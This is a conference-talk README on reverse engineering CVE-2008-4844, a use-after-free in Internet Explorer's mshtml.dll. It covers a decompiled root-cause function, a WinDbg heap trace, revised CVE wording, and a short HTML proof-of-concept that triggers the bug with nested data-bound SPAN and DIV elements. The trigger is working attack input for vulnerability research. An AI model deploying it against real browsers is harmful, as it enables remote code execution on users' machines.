```
/**************************************************************************
 * Talk:        Inception - The extended edition
 * Author:      Nelson Brito <nbrito *NoSPAM* sekure.org>
 * Conference:  Hackers to Hackers Conference Eighth Edition (October 2011)
 **************************************************************************
 *         .___                            __  .__                        *
 *         |   | ____   ____  ____ _______/  |_|__| ____   ____           *
 *         |   |/    \_/ ___\/ __ \\____ \   __\  |/  _ \ /    \          *
 *         |   |   |  \  \__\  ___/|  |_> >  | |  (  <_> )   |  \         *
 *         |___|___|__/\_____>_____>   __/|__| |__|\____/|___|__/         *
 *                                 |__|                                   *
 *                     _______________  ____ ____                         *
 *                     \_____  \   _  \/_   /_   |                        *
 *                      /  ____/  /_\  \|   ||   |                        *
 *                     /       \  \_/   \   ||   |                        *
 *                     \________\_______/___||___|                        *
 *                                                                        *
 **************************************************************************/
```
# Inception
_"Sometimes, the best way to advance is in reverse"_. ([Reversing: Secrest of Reverse Engineering](https://en.wikipedia.org/wiki/Reversing:_Secrets_of_Reverse_Engineering))

Every time any new vulnerability comes out we should be ready to understand it, in order to perform its exploitation or even to build defenses. [Reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) is one of the most powerful approaches.

Many talks have been done in the last years, as well as too many useless information has been given by security community:
* Some talks have addressed particular frameworks, specific tools and a few libraries.
* No practical demonstration and/or tips and tricks regarding vulnerabilities, leaving the **black magic** hidden to the audience.

This [talk](https://github.com/nbrito/talks/blob/master/2016/ibm-systems/nbrito-inception.pdf) shares some tips and trick learned during real vulnerability reversing process, such as:
* Gathering information about the vulnerability.
* Understand the weakness type.
* Preparing the vulnerable ecosystem.
* Building a toolbox to be used.
* [Reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) the vulnerability.
* Etc...

It shows, using very detailed [demonstration](https://vimeo.com/nbrito), how to achieve the **state-of-art** building exploitation and defenses, using your own exploitation skills.

The **black magic** is finally unveiled, showing how to use tools (public available) to understand and apply [reverse engineering](https://en.wikipedia.org/wiki/Reverse_engineering) to a vulnerability.

## Root Cause

###  ```CRecordInstance::TransferToDestination```
```
int CRecordInstance::TransferToDestination () {
    int ebp_minus_4h, eax;
    int esi, ebx = 0;
    
    esi = (sizeof(edi) >> 2) - 1;

    ebp_minus_4h = ebx;
    
    do{
        if(edi[ebx] == 0) continue;

        eax = edi[ebx]->TransferFromSrc();

        if((ebp_minus_4h == 0) && (eax != 0))
            ebp_minus_4h = eax;

        ebx++;
    }while(ebx <= esi);

    return(ebp_minus_4h);
}
````

### ```HEAP```
```
0:017> !heap -p -a 063eb158
	address 063eb158 found in
	_HEAP @ 140000
	  HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state
		063eb128 000a 0000  [07]   063eb130    00032 - (busy)
		  ? <Unloaded_ud.drv>+610069
		Trace: 6af6
		7c96cf9a ntdll!RtlDebugAllocateHeap+0x000000e1
		7c949564 ntdll!RtlAllocateHeapSlowly+0x00000044
		7c918f01 ntdll!RtlAllocateHeap+0x00000e64
		7e8e8926 mshtml!_MemAlloc+0x00000023
		7e86dcf6 mshtml!_MemAllocString+0x00000049
		7e86de4c mshtml!_MemReplaceString+0x00000019
		7e86e0a1 mshtml!CProgSink::SetProgress+0x000000e2
		7e86e297 mshtml!CDwnLoad::RequestProgress+0x00000029
		7e86df0a mshtml!CDwnInfo::AddProgSink+0x00000090
		7e86de70 mshtml!CDwnCtx::SetProgSink+0x0000002d
		7e8c5627 mshtml!CImgHelper::SetImgCtx+0x0000019e
		7e85bb90 mshtml!CImgHelper::FetchAndSetImgCtx+0x0000006e
		7e85bb18 mshtml!CImgHelper::SetImgSrc+0x00000023
		7e886855 mshtml!CImgHelper::EnterTree+0x00000127
		7e8867a3 mshtml!CImgHelper::Notify+0x000001b6
		7e8cf890 mshtml!CImgElement::Notify+0x0000002c
		7e8ab94a mshtml!CSpliceTreeEngine::InsertSplice+0x00000a09
		7e8a99e7 mshtml!CMarkup::SpliceTreeInternal+0x000000ac
		7e8aa8ba mshtml!CDoc::CutCopyMove+0x000000d8
		7e8aac2b mshtml!CDoc::Move+0x00000018
		7e8ad44d mshtml!HandleHTMLInjection+0x00000187
		7e8ad2d9 mshtml!HandleHTMLInjection+0x00000050
		7e8aae80 mshtml!CElement::Inject+0x000002ee
		7ea66c1f mshtml!CDBindMethodsText::BoundValueToElement+0x00000022
		7eaf2c0d mshtml!CDBindMethodsMarquee::BoundValueToElement+0x00000017
		7ea81d85 mshtml!CXfer::TransferFromSrc+0x000000c5
		7ea82299 mshtml!CRecordInstance::TransferToDestination+0x0000002a
		7ea82870 mshtml!CRecordInstance::SetHRow+0x00000045
		7ea82fb8 mshtml!CCurrentRecordInstance::OnRowPositionChange+0x0000005d
		7317f285 oledb32!CRowPosition::FireRowPositionChange+0x00000096
		7317f81d oledb32!CRowPosition::SetRowPosition+0x00000117
		7ea831f5 mshtml!CCurrentRecordInstance::InitCurrentRow+0x0000007b
```

For further information, please, refer to this [link](https://github.com/nbrito/research/tree/master/inception/reversing).

## [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) Description
After three years, the CVE Editorial Board has decided to change the description for [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) based on this research. As a direct result, the [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) is much more accurate than before. Check by yourself...

### Previous
_Use-after-free vulnerability in mshtml.dll in Microsoft Internet Explorer 5.01, 6, and 7 on Windows XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, and Server 2008 allows remote attackers to execute arbitrary code via a crafted XML document containing nested SPAN elements, as exploited in the wild in December 2008._

### Current
_Use-after-free vulnerability in the ```CRecordInstance::TransferToDestination``` function in mshtml.dll in Microsoft Internet Explorer 5.01, 6, 6 SP1, and 7 allows remote attackers to execute arbitrary code via DSO bindings involving (1) an XML Island, (2) XML DSOs, or (3) Tabular Data Control (TDC) in a crafted HTML or XML document, as demonstrated by nested ```SPAN``` or ```MARQUEE``` elements, and exploited in the wild in December 2008._

### Lacking Further Information
Even with this update, the [CVE-2008-4844](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4844) description still lacks further information, because nested ```DIV```, ```LABEL```, ```LEGEND```, ```MARQUEE``` and ```SPAN``` elements can also be used to reprocude the vulnerability, and they does not even need to be the same, they can be mixed. Example:
```
<HTML>
<SCRIPT LANGUAGE="JavaScript">
function Inception (){
	document.getElementById("b00m").innerHTML =
		"<XML ID=I>" +
		"<X>" +
		"<C>" +
		"&lt;IMG SRC=&quot;javascript:alert(&apos;XSS&apos;)&quot;&gt;" +
		"</C>" +
		"</X>" +
		"</XML>" +
		"<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>" +
		"<DIV DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>" +
		"</DIV>" +
		"</SPAN>";
}
</SCRIPT>
<BODY onLoad="Inception();">
<DIV ID="b00m" STYLE="display: none;">
</DIV>
</BODY>
</HTML>
```
For further information, please, refer to this [link](https://github.com/nbrito/research/tree/master/pop/html/ips-bypass-test-bed).

## Credits
[Nelson Brito](https://fnstenv.blogspot.com) (a.k.a. repository's owner)

## Disclaimer
Codes are available for research purposes only, and the repository's owner vehemently denies the malicious use, as well as the illegal purpose use, of any information, code and/or tool contained in this repository.

If you think there is any information, code and/or tool that sould not be here, please, contact the repository's owner.

## Warning
This repository does not provide you with any legal rights to any intellectual property in any information, code and/or tool, also, be aware that the use of some information, code and/or tool may be forbidden in some countries, and there may be rules and laws prohibiting any unauthorized user from use the information, code and/or tool, being these actions considered illegal.
